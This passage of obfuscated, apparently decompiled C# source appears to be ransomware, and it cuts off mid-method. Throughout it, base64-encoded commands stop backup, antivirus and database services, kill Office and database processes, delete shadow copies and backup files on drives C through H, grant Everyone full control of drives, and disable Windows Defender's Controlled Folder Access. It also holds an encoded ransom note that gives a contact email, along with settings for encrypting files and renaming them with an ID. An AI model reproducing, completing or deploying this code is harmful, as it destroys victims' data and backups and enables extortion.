		agZtqMkMayfivgE("c3RvcCBNU09MQVAkVFBTIC95"),
		agZtqMkMayfivgE("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
		agZtqMkMayfivgE("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
		agZtqMkMayfivgE("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
		agZtqMkMayfivgE("c3RvcCBBY3JTY2gyU3ZjIC95"),
		agZtqMkMayfivgE("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
		agZtqMkMayfivgE("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
		agZtqMkMayfivgE("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
		agZtqMkMayfivgE("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBBUlNNIC95"),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
		agZtqMkMayfivgE("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
		agZtqMkMayfivgE("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
		agZtqMkMayfivgE("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
		agZtqMkMayfivgE("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
		agZtqMkMayfivgE("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
		agZtqMkMayfivgE("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRQUk9EIC95"),
		agZtqMkMayfivgE("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		agZtqMkMayfivgE("c3RvcCBBbnRpdmlydXMgL3k="),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
		agZtqMkMayfivgE("c3RvcCBBVlAgL3k="),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
		agZtqMkMayfivgE("c3RvcCBEQ0FnZW50IC95"),
		agZtqMkMayfivgE("c3RvcCBiZWRiZyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
		agZtqMkMayfivgE("c3RvcCBFaHR0cFNydiAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNTVMgL3k="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
		agZtqMkMayfivgE("c3RvcCBla3JuIC95"),
		agZtqMkMayfivgE("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
		agZtqMkMayfivgE("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRUUFMgL3k="),
		agZtqMkMayfivgE("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
		agZtqMkMayfivgE("c3RvcCBudHJ0c2NhbiAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
		agZtqMkMayfivgE("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
		agZtqMkMayfivgE("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		agZtqMkMayfivgE("c3RvcCBFU0hBU1JWIC95"),
		agZtqMkMayfivgE("c3RvcCBTRFJTVkMgL3k="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
		agZtqMkMayfivgE("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
		agZtqMkMayfivgE("c3RvcCBLQVZGUyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBTUUxXcml0ZXIgL3k="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBLQVZGU0dUIC95"),
		agZtqMkMayfivgE("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
		agZtqMkMayfivgE("c3RvcCBrYXZmc3NscCAveQ=="),
		agZtqMkMayfivgE("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
		agZtqMkMayfivgE("c3RvcCBrbG5hZ2VudCAveQ=="),
		agZtqMkMayfivgE("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBtYWNtbnN2YyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
		agZtqMkMayfivgE("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
		agZtqMkMayfivgE("c3RvcCBtYXN2YyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		agZtqMkMayfivgE("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
		agZtqMkMayfivgE("c3RvcCBNQkFNU2VydmljZSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
		agZtqMkMayfivgE("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
		agZtqMkMayfivgE("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
		agZtqMkMayfivgE("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
		agZtqMkMayfivgE("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
		agZtqMkMayfivgE("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
		agZtqMkMayfivgE("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
		agZtqMkMayfivgE("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
		agZtqMkMayfivgE("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
		agZtqMkMayfivgE("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNeVNRTDU3IC95"),
		agZtqMkMayfivgE("c3RvcCBNY1NoaWVsZCAveQ=="),
		agZtqMkMayfivgE("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
		agZtqMkMayfivgE("c3RvcCBNeVNRTDgwIC95"),
		agZtqMkMayfivgE("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
		agZtqMkMayfivgE("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
		agZtqMkMayfivgE("c3RvcCBtZmVmaXJlIC95"),
		agZtqMkMayfivgE("c3RvcCB3YmVuZ2luZSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		agZtqMkMayfivgE("c3RvcCBtZmVtbXMgL3k="),
		agZtqMkMayfivgE("c3RvcCB3YmVuZ2luZSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBSRVN2YyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBtZmV2dHAgL3k="),
		agZtqMkMayfivgE("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
		agZtqMkMayfivgE("c3RvcCBzYWNzdnIgL3k="),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
		agZtqMkMayfivgE("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
		agZtqMkMayfivgE("c3RvcCBTQVZTZXJ2aWNlIC95"),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
		agZtqMkMayfivgE("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
		agZtqMkMayfivgE("c3RvcCBTaE1vbml0b3IgL3k="),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
		agZtqMkMayfivgE("c3RvcCBTbWNpbnN0IC95"),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		agZtqMkMayfivgE("c3RvcCBTbWNTZXJ2aWNlIC95"),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
		agZtqMkMayfivgE("c3RvcCBTbnRwU2VydmljZSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
		agZtqMkMayfivgE("c3RvcCBzb3Bob3NzcHMgL3k="),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
		agZtqMkMayfivgE("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
		agZtqMkMayfivgE("c3RvcCBzd2lfZmlsdGVyIC95"),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
		agZtqMkMayfivgE("c3RvcCBzd2lfc2VydmljZSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
		agZtqMkMayfivgE("c3RvcCBzd2lfdXBkYXRlIC95"),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		agZtqMkMayfivgE("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
		agZtqMkMayfivgE("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
		agZtqMkMayfivgE("c3RvcCBUbUNDU0YgL3k="),
		agZtqMkMayfivgE("c3RvcCBTUUxCcm93c2VyIC95"),
		agZtqMkMayfivgE("c3RvcCB0bWxpc3RlbiAveQ=="),
		agZtqMkMayfivgE("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBUcnVlS2V5IC95"),
		agZtqMkMayfivgE("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		agZtqMkMayfivgE("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		agZtqMkMayfivgE("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		agZtqMkMayfivgE("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		agZtqMkMayfivgE("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		agZtqMkMayfivgE("c3RvcCBXUlNWQyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		agZtqMkMayfivgE("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> maWbHytheKDQ = new List<string>
	{
		agZtqMkMayfivgE("Y29uZmlnIERuc2NhY2hlIHN0YXJ0PSBhdXRv"),
		agZtqMkMayfivgE("Y29uZmlnIEZEUmVzUHViIHN0YXJ0PSBhdXRv"),
		agZtqMkMayfivgE("Y29uZmlnIFNTRFBTUlYgc3RhcnQ9IGF1dG8="),
		agZtqMkMayfivgE("Y29uZmlnIHVwbnBob3N0IHN0YXJ0PSBhdXRv"),
		agZtqMkMayfivgE("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		agZtqMkMayfivgE("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		agZtqMkMayfivgE("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		agZtqMkMayfivgE("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> qvNSfDETWfhXrQd = new List<string>
	{
		agZtqMkMayfivgE("L0lNIG1zcHViLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		agZtqMkMayfivgE("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		agZtqMkMayfivgE("L0lNIG15c3FsZC5leGUgL0Y="),
		agZtqMkMayfivgE("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		agZtqMkMayfivgE("L0lNIGFnbnRzdmMuZXhlIC9G"),
		agZtqMkMayfivgE("L0lNIHRoZWJhdC5leGUgL0Y="),
		agZtqMkMayfivgE("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIGVuY3N2Yy5leGUgL0Y="),
		agZtqMkMayfivgE("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIENOVEFvU01nci5leGUgL0Y="),
		agZtqMkMayfivgE("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		agZtqMkMayfivgE("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIGRiZW5nNTAuZXhlIC9G"),
		agZtqMkMayfivgE("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIG9jb21tLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIHpvb2x6LmV4ZSAvRg=="),
		agZtqMkMayfivgE("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		agZtqMkMayfivgE("L0lNIGRic25tcC5leGUgL0Y="),
		agZtqMkMayfivgE("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		agZtqMkMayfivgE("L0lNIG1zcHViLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIG9uZW5vdGUuZXhlIC9G"),
		agZtqMkMayfivgE("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIG91dGxvb2suZXhlIC9G"),
		agZtqMkMayfivgE("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		agZtqMkMayfivgE("L0lNIHZpc2lvLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		agZtqMkMayfivgE("L0lNIHdpbndvcmQuZXhlIC9G"),
		agZtqMkMayfivgE("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		agZtqMkMayfivgE("L0lNIHdvcmRwYWQuZXhlIC9G"),
		agZtqMkMayfivgE("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		agZtqMkMayfivgE("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		agZtqMkMayfivgE("L0lNIG9jc3NkLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIG9yYWNsZS5leGUgL0Y="),
		agZtqMkMayfivgE("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		agZtqMkMayfivgE("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		agZtqMkMayfivgE("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> SBrBsecLKNoTe = new List<string>
	{
		agZtqMkMayfivgE(pQwJuYtkrVyfmA("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR")),
		agZtqMkMayfivgE("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		agZtqMkMayfivgE("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		agZtqMkMayfivgE("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		agZtqMkMayfivgE("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		agZtqMkMayfivgE("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		agZtqMkMayfivgE("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		agZtqMkMayfivgE("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		agZtqMkMayfivgE("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		agZtqMkMayfivgE("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		agZtqMkMayfivgE("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		agZtqMkMayfivgE("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		agZtqMkMayfivgE("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		agZtqMkMayfivgE(pQwJuYtkrVyfmA("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR"))
	};

	public static string KKjdYuiUauDNY = agZtqMkMayfivgE("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkX0RlbGV0ZSgpOyB9");

	public static List<string> SnnXjQNEXDYsoF = new List<string>
	{
		agZtqMkMayfivgE("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		agZtqMkMayfivgE("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		agZtqMkMayfivgE("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		agZtqMkMayfivgE("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		agZtqMkMayfivgE("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		agZtqMkMayfivgE("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static List<string> WdIEePnOQjN = new List<string>
	{
		agZtqMkMayfivgE("IkM6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		agZtqMkMayfivgE("IkQ6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		agZtqMkMayfivgE("Ilo6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=")
	};

	public static string ZTdztQaAOyr = "NO";

	public static string iRObUsTjwrSWxLpsJvO = "NO";

	internal static DateTime JjjCfPpnauLH = new DateTime(2000, 1, 1);

	internal static DateTime dEUOVBrnPjH = new DateTime(2100, 1, 1);

	public static string ldEZLuOxqcFm = "YES";

	public static string OonNbDeTktyi = "10";

	public static string hzumHfYGXpfXpx = "NO";

	public static string zOlrcjfdlDHTOkES = "NO";

	public static string VwLaRXzSQPto = "NO";

	public static string aKeYpJDnYDtPC = "YES";

	public static string wqfZRsOMPbjuoEVs = "NO";

	public static string wrHvZpAvrSgJW = "NO";

	public static List<string> sSiWAwlCjtk = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string LmSFIAUjDvp = "NO";

	public static string zlQvQSTQrWnJ = "1";

	public static string MlClZAEPQyhz = "NO";

	public static string zOOYSHYSeWvOobzd = "NO";

	public static string VTicgDiYEecL = "NO";

	public static string QgAgVrOmAPN = string.Empty;

	public static string KJaSPZQdyYsfjDG = "NO";

	public static string KOWNRAOhNTbHh = "YES";

	public static string vBaduAPxqot = "YES";

	public static string FaGAiVbpXFuGv = "QXR0ZW50aW9uIEF0dGVudGlvbiBBdHRlbnRpb24h";

	public static string HuZwHZTqsYcw = "RGlkIHlvdSBnZXQgaW4gdHJvdWJsZT8NCkVtYWlsIG91ciBJVCBwcm9mZXNzaW9uYWxzIGFuZCBwcm92aWRlIHlvdSB3aXRoIGEgc29sdXRpb24hDQoNCmVtYWlsIC0gcmVjb3ZlcnlmaWxlc0B0ZWNobWFpbC5pbmZv";

	public static string knbpyWMivm = "NO";

	public static string oyEKVgjWAAFWE = "YES";

	public static string bNWpiFiTBoWLej = "NO";

	public static string apnYWRzavjhfE = "NO";

	public static string OxBmFTMsmEdGse = "NO";

	public static string lFEAqibzXp = "LOGONISOFF";

	public static string GMTnWCjFlwgNfs = "NO";

	public static string kZnwhBlPHreC = "YES";

	public static string ZJFGqhHHen = "reload1.lnk";

	public static string ChboADDhpopgpg = "NO";

	public static string MbhhcifckfQWC = "YES";

	public static string AqzCjOIAsEwJB = "NO";

	public static string zVuzYLSYgUmyh = "NO";

	public static string EyQuTisxzdRHp = "VGhhbm9z";

	public static string gqLrGdvKAuk = "YES";

	public static string DeTwNBVFGbT = "YES";

	public static string JDyrrLPaABiFnK = "NO";

	public static string XuXlSigPgmIZZk = "NO";

	public static string[] VTOPORIJkY = new string[0];

	public static string plYUDCqFaSkhDF = "YES";

	public static bool WSwhVqfGVa = true;

	public static string iZnRexINEwkRV = "YES";

	public static bool QHRYFfpHvmAnP = true;

	public static bool XAoZigRKkvAz = true;

	public static bool bNHOcWPoAIFRY = true;

	public static bool dZmeCkKbjiaW = true;

	public static string SlCyjezmzcjRF = "Debug_Log.txt";

	public static bool bZJnUpHOpIgqq = false;

	public static bool RxGWpvIgBdigX = true;

	public static bool hmNsKOlRtpeG = true;

	public static bool FQIijKxWNIGko = false;

	public static bool SgwcaMaFwGfR = true;

	public static string uLoFxWVggAfF = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + hmdnzLvPRv.fVoScpXlDYrrq() + ".txt";

	public static bool hzzRDIjGDyq = false;

	public static Stopwatch QMLgweyVlKVxgDIGaL = new Stopwatch();

	public static int SysSpLHfXXw = 0;

	public static int lerIQIfDMA = 0;

	public static bool ZKQhNlGAfwnU = false;

	public static string qoCjIwmYfANN = ".[ID-" + hmdnzLvPRv.fVoScpXlDYrrq() + "]";

	public static string[] DPJyFpOJPgNyp = new string[1] { "\"db\",\"dbf\",\"accdb\",\"dbx\",\"mdb\",\"mdf\",\"epf\",\"ndf\",\"ldf\",\"1cd\",\"sdf\",\"nsf\",\"fp7\",\"cat\",\"log\"" };

	public static List<string> VimSUcVQeamd = new List<string>();

	public static int PRCzDJqMXxgFe = 0;

	public static bool NhUiHaxsDy = true;

	public static List<string> sTLtTCfquFXGm = new List<string>();

	public static List<string> ewVfVkKnwKUFQ = new List<string>();

	public static List<string> KXsGplLISxHMcZK = new List<string>();

	private static void Main(string[] args)
	{
		try
		{
			string uSAYpqXEXWENr = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process p) => p.ProcessName == uSAYpqXEXWENr) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			TrMpeCAvxFTYuIxo.uHtkocBrShyzfT(pcRfoHGaJe);
		}
		catch (Exception)
		{
		}
		try
		{
			if (gqLrGdvKAuk == "YES")
			{
				Thread thread = new Thread(OAdBHDuVAPbpUTk.RpGViywqIiQlJ);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (vvVGzNdmiUGV == "YES")
		{
			Thread.Sleep(int.Parse(zFYAOLWMfSryA));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && wqfZRsOMPbjuoEVs == "YES")
		{
			try
			{
				RJzEqdmGtigGn(agZtqMkMayfivgE("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		try
		{
			if (VNMAxwwctwAAjI == "YES" && sDEurotmlSp.wUNkGYGntmxQr())
			{
